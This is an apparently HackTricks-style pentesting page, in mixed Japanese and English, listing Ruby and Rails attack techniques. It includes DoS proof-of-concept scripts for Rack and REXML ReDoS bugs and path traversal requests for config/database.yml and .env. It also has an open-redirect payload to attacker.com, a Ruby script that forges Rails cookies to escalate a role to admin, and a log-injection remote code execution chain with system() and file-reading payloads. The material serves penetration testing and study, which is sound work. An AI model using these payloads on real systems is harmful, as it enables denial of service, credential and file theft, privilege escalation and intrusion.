# Rubyのトリック

{{#include ../../banners/hacktricks-training.md}}

## File upload to RCE

As explained in [this article](https://www.offsec.com/blog/cve-2024-46986/), uploading a `.rb` file into sensitive directories such as `config/initializers/` can lead to remote code execution (RCE) in Ruby on Rails applications.

ヒント:
- アプリ起動時に実行される他の boot／eager-load の場所も、書き込み可能であれば危険です（例：`config/initializers/` が典型）。`config/` 以下に任意のファイルアップロードが配置され、その後評価／requireされると、起動時にRCEを得られる可能性があります。
- Railsが起動時に読み込むコンテナイメージにユーザー制御のファイルをコピーする dev/staging ビルドを探してください。

## Active Storage image transformation → command execution (CVE-2025-24293)

When an application uses Active Storage with `image_processing` + `mini_magick`, and passes untrusted parameters to image transformation methods, Rails versions prior to 7.1.5.2 / 7.2.2.2 / 8.0.2.1 could allow command injection because some transformation methods were mistakenly allowed by default.

- A vulnerable pattern looks like:
```erb
<%= image_tag blob.variant(params[:t] => params[:v]) %>
```
where `params[:t]` and/or `params[:v]` are attacker-controlled.

- テスト時に試すこと
- 変種／processing オプション、変換名、または任意の ImageMagick 引数を受け付けるエンドポイントを特定してください。
- `params[:t]` と `params[:v]` をファズして、疑わしいエラーや実行の副作用を探します。メソッド名を制御したり、MiniMagick に到達する生の引数を渡せると、画像処理ホストでのコード実行を引き起こせる可能性があります。
- 生成されたバリアントに対して読み取りのみのアクセスしかない場合は、細工した ImageMagick 操作でブラインドな抜き取り（exfiltration）を試みてください。

- 対策／検出
- Active Storage + `image_processing` + `mini_magick` を使用していて、ユーザー制御の変換があり、かつ Rails < 7.1.5.2 / 7.2.2.2 / 8.0.2.1 を見かけたら、悪用可能と見なしてください。アップグレードを推奨し、メソッド／パラメータの厳格な許可リスト（allowlist）と強化された ImageMagick ポリシーの適用を推奨します。

## Rack::Static LFI / path traversal (CVE-2025-27610)

If the target stack uses Rack middleware directly or via frameworks, versions of `rack` prior to 2.2.13, 3.0.14, and 3.1.12 allow Local File Inclusion via `Rack::Static` when `:root` is unset/misconfigured. Encoded traversal in `PATH_INFO` can expose files under the process working directory or an unexpected root.

- `config.ru` やミドルウェアスタックで `Rack::Static` をマウントしているアプリを探してください。静的パスに対してエンコードされたトラバーサルを試します。例：
```text
GET /assets/%2e%2e/%2e%2e/config/database.yml
GET /favicon.ico/..%2f..%2f.env
```
`urls:` に合わせてプレフィックスを調整してください。アプリがファイル内容で応答する場合、解決された `:root` 以下の任意のファイルへの LFI を持っている可能性が高いです。

- 緩和策：Rack をアップグレードし、`:root` が公開ファイルのみを指すディレクトリに明示的に設定されていることを確認してください。

## Rack multipart parser ReDoS / request smuggling (CVE-2024-25126)

Rack < `3.0.9.1` and < `2.2.8.1` spent super-linear time parsing crafted `Content-Type: multipart/form-data` headers. A single POST with a gigantic `A=` parameter list can peg a Puma/Unicorn worker and cause DoS or request queue starvation.

- Quick PoC (will hang one worker):
```bash
python - <<'PY'
import requests
h = {'Content-Type': 'multipart/form-data; ' + 'A='*5000}
requests.post('http://target/', data='x', headers=h)
PY
```
- Rails/Sinatra/Hanami/Grape など任意の Rack ベースのスタックに対して有効です。nginx/haproxy の背後で keep-alive が有効な場合、並列で繰り返してワーカーを枯渇させてください。
- パッチはパーサーを線形時間にすることで提供されました；`rack` gem のバージョンが < `3.0.9.1` または < `2.2.8.1` を探してください。評価レポートでは、ヘッダが構文的に有効なため WAF がこの攻撃をブロックすることは稀である点を指摘してください。

## REXML XML parser ReDoS (CVE-2024-49761)

The REXML gem < 3.3.9 (Ruby 3.1 and earlier) catastrophically backtracks when parsing hex numeric character references containing long digit runs (e.g., `&#1111111111111x41;`). Any XML processed by REXML or libraries that wrap it (SOAP/XML API clients, SAML, SVG uploads) can be abused for CPU exhaustion.

Minimal trigger against a Rails endpoint that parses XML:
```bash
curl -X POST http://target/xml -H 'Content-Type: application/xml' \
--data '<?xml version="1.0"?><r>&#11111111111111111111111111x41;</r>'
```
プロセスが数秒間高負荷のままで worker CPU が急上昇する場合、脆弱である可能性が高い。攻撃は低帯域で、XML を取り込むバックグラウンドジョブにも影響する。

## CGI cookie 解析 / escapeElement ReDoS (CVE-2025-27219 & CVE-2025-27220)

多くの Rack スタックでデフォルトの `cgi` gem を使用しているアプリは、単一の悪意あるヘッダでフリーズする可能性がある：
- `CGI::Cookie.parse` は超線形で、大きな cookie 文字列（数千の区切り文字）が O(N²) の挙動を引き起こす。
- `CGI::Util#escapeElement` の正規表現により、HTML エスケープで ReDoS が可能だった。

どちらの問題も `cgi` の 0.3.5.1 / 0.3.7 / 0.4.2 で修正されている。pentests では、巨大な `Cookie:` ヘッダを投げるか、信頼されていない HTML を helper コードに渡して worker のロックアップを確認する。効果を増幅させるために keep-alive と組み合わせる。

## Basecamp `googlesign_in` open redirect / cookie flash leak (CVE-2025-57821)

`googlesign_in` gem < 1.3.0（Rails の Google OAuth に使用される）は `proceedto` パラメータに対する same-origin チェックを不完全に行っていた。`proceedto=//attacker.com/%2F..` のような不正な URL はチェックをバイパスし、ユーザをオフサイトにリダイレクトしつつ Rails の flash/session cookies を保持する。

Exploit flow:
1. 被害者が攻撃者がホストした細工された Google Sign-In リンクをクリックする。
2. 認証後、gem は攻撃者管理下のドメインにリダイレクトし、flash notices やワイルドカードドメインにスコープされた cookie に保存された任意のデータを leak してしまう。
3. アプリが短期間有効なトークンや magic links を flash に保存している場合、これがアカウント乗っ取りに繋がる可能性がある。

テスト時は Gemfile.lock を grep して `googlesign_in` < 1.3.0 を探し、`proceedto` に不正な値を試す。Location ヘッダと cookie の反映で確認する。

## Forging/decrypting Rails cookies when `secret_key_base` is leaked

Rails は `secret_key_base` から派生したキーを使用して cookies を暗号化・署名する。その値が漏洩している場合（例: リポジトリ、ログ、誤設定された認証情報）、通常は cookie を復号し、改変して再暗号化できる。アプリが cookie に role、user ID、または feature flags を保存している場合、これにより認可バイパスが発生することが多い。

Minimal Ruby to decrypt and re-encrypt modern cookies (AES-256-GCM, default in recent Rails):

<details>
<summary>Ruby による cookie の復号/偽造</summary>
```ruby
require 'cgi'
require 'json'
require 'active_support'
require 'active_support/message_encryptor'
require 'active_support/key_generator'

secret_key_base = ENV.fetch('SECRET_KEY_BASE_LEAKED')
raw_cookie = CGI.unescape(ARGV[0])

salt   = 'authenticated encrypted cookie'
cipher = 'aes-256-gcm'
key_len = ActiveSupport::MessageEncryptor.key_len(cipher)
secret  = ActiveSupport::KeyGenerator.new(secret_key_base, iterations: 1000).generate_key(salt, key_len)
enc     = ActiveSupport::MessageEncryptor.new(secret, cipher: cipher, serializer: JSON)

plain = enc.decrypt_and_verify(raw_cookie)
puts "Decrypted: #{plain.inspect}"

# Modify and re-encrypt (example: escalate role)
plain['role'] = 'admin' if plain.is_a?(Hash)
forged = enc.encrypt_and_sign(plain)
puts "Forged cookie: #{CGI.escape(forged)}"
```
</details>
Notes:
- Older apps may use AES-256-CBC and salts `encrypted cookie` / `signed encrypted cookie`, or JSON/Marshal serializers. Adjust salts, cipher, and serializer accordingly.
- On compromise/assessment, rotate `secret_key_base` to invalidate all existing cookies.

## See also (Ruby/Rails-specific vulns)

- Ruby deserialization and class pollution:
{{#ref}}
../../pentesting-web/deserialization/README.md
{{#endref}}
{{#ref}}
../../pentesting-web/deserialization/ruby-class-pollution.md
{{#endref}}
{{#ref}}
../../pentesting-web/deserialization/ruby-_json-pollution.md
{{#endref}}
- Template injection in Ruby engines (ERB/Haml/Slim, etc.):
{{#ref}}
../../pentesting-web/ssti-server-side-template-injection/README.md
{{#endref}}


## Log Injection → RCE via Ruby `load` and `Pathname.cleanpath` smuggling

When an app (often a simple Rack/Sinatra/Rails endpoint) both:
- logs a user-controlled string verbatim, and
- later `load`s a file whose path is derived from that same string (after `Pathname#cleanpath`),

You can often achieve remote code execution by poisoning the log and then coercing the app to `load` the log file. Key primitives:

- Ruby `load` evaluates the target file content as Ruby regardless of file extension. Any readable text file whose contents parse as Ruby will be executed.
- `Pathname#cleanpath` collapses `.` and `..` segments without hitting the filesystem, enabling path smuggling: attacker-controlled junk can be prepended for logging while the cleaned path still resolves to the intended file to execute (e.g., `../logs/error.log`).

### 最小限の脆弱パターン
```ruby
require 'logger'
require 'pathname'

logger   = Logger.new('logs/error.log')
param    = CGI.unescape(params[:script])
path_obj = Pathname.new(param)

logger.info("Running backup script #{param}")            # Raw log of user input
load "scripts/#{path_obj.cleanpath}"                     # Executes file after cleanpath
```
### なぜログに有効な Ruby が含まれる可能性があるのか
`Logger` は次のようなプレフィックス行を書きます:
```
I, [9/2/2025 #209384]  INFO -- : Running backup script <USER_INPUT>
```
In Ruby, `#` starts a comment and `9/2/2025` is just arithmetic. To inject valid Ruby code you need to:
- ペイロードを新しい行で開始して、INFO 行の `#` によってコメントアウトされないようにする。先頭に改行 (`\n` または `%0A`) を送る。
- INFO 行で導入された未閉鎖の `[` を閉じる。一般的なトリックは `]` で始め、必要に応じてパーサーを満足させるために `][0]=1` を続けることです。
- その後、任意の Ruby を置く（例: `system(...)`）。

Example of what will end up in the log after one request with a crafted param:
```
I, [9/2/2025 #209384]  INFO -- : Running backup script
][0]=1;system("touch /tmp/pwned")#://../../../../logs/error.log
```
### コードをログに書き込みつつログパスに解決する単一文字列のすり抜け
攻撃者が制御する1つの文字列を用意したい。条件は次の通り：
- 生のままログに出力されるときに、Ruby payloadを含んでいること、および
- `Pathname.new(<input>).cleanpath` に渡したときに `../logs/error.log` に解決され、その後の `load` が直前に汚染したログファイルを実行すること。

`Pathname#cleanpath` はスキームを無視し、トラバーサル要素を折り畳むため、次のようにすればうまくいきます：
```ruby
require 'pathname'

p = Pathname.new("\n][0]=1;system(\"touch /tmp/pwned\")#://../../../../logs/error.log")
puts p.cleanpath   # => ../logs/error.log
```
- `://`の前の`#`はログが実行されるときにRubyが末尾を無視することを保証し、`cleanpath`はそれでもサフィックスを`../logs/error.log`に短縮します。
- 先頭の改行は INFO行 から抜け出し、`]` がぶら下がった括弧を閉じ、`][0]=1` がパーサを満たします。

### End-to-end exploitation
1. バックアップスクリプト名として次の文字列を送信します（必要なら最初の改行を%0AとしてURLエンコードしてください）:
```
\n][0]=1;system("id > /tmp/pwned")#://../../../../logs/error.log
```
2. アプリは生の文字列を`logs/error.log`にそのまま記録します。
3. アプリは`cleanpath`を計算し、それが`../logs/error.log`に解決され、`load`を呼び出します。
4. Rubyはログに注入したコードを実行します。

CTFのような環境でファイルをexfiltrateするには:
```
\n][0]=1;f=Dir['/tmp/flag*.txt'][0];c=File.read(f);puts c#://../../../../logs/error.log
```
URL-encoded PoC (最初の文字は改行):
```
%0A%5D%5B0%5D%3D1%3Bf%3DDir%5B%27%2Ftmp%2Fflag%2A.txt%27%5D%5B0%5D%3Bc%3DFile.read(f)%3Bputs%20c%23%3A%2F%2F..%2F..%2F..%2F..%2Flogs%2Ferror.log
```
## 参考文献

- [Rails セキュリティ発表: CVE-2025-24293 Active Storage unsafe transformation methods (fixed in 7.1.5.2 / 7.2.2.2 / 8.0.2.1)](https://discuss.rubyonrails.org/t/cve-2025-24293-active-storage-allowed-transformation-methods-potentially-unsafe/89670)
- [GitHub Advisory: Rack::Static ローカルファイルインクルージョン (CVE-2025-27610)](https://github.com/advisories/GHSA-7wqh-767x-r66v)
- [Hardware Monitor Dojo-CTF #44: Log Injection による Ruby RCE (YesWeHack Dojo)](https://www.yeswehack.com/dojo/dojo-ctf-challenge-winners-44)
- [Ruby Pathname.cleanpath docs](https://docs.ruby-lang.org/en/3.4/Pathname.html#method-i-cleanpath)
- [Ruby Logger](https://ruby-doc.org/stdlib-2.5.1/libdoc/logger/rdoc/Logger.html)
- [Ruby の load の仕組み](https://blog.appsignal.com/2023/04/19/how-to-load-code-in-ruby.html)
- [Rack multipart ReDoS アドバイザリ (CVE-2024-25126)](https://www.cve.news/cve-2024-25126/)
- [CGI / URI に関する Ruby セキュリティアドバイザリ (CVE-2025-27219/27220/27221)](https://www.ruby-lang.org/en/news/2025/02/26/security-advisories/)

{{#include ../../banners/hacktricks-training.md}}
